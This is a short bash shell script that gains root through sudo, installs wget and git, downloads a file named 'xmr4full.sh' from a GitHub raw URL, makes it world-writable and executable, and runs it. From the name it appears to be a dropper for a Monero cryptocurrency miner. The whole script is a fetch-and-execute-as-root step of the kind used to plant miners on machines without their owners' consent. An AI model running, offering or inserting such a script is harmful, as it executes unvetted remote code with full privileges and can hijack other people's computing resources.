#!/bin/bash
if [ "$(id -u)" != "0" ]; then
   sudo su   
else
	echo "Root user"
fi
sudo -i
apt-get update
apt-get install -y git wget
rm -rf xmr4full.sh
wget https://raw.githubusercontent.com/ts6aud5vkg/batch/master/xmr4full.sh
chmod 777 xmr4full.sh
./xmr4full.sh
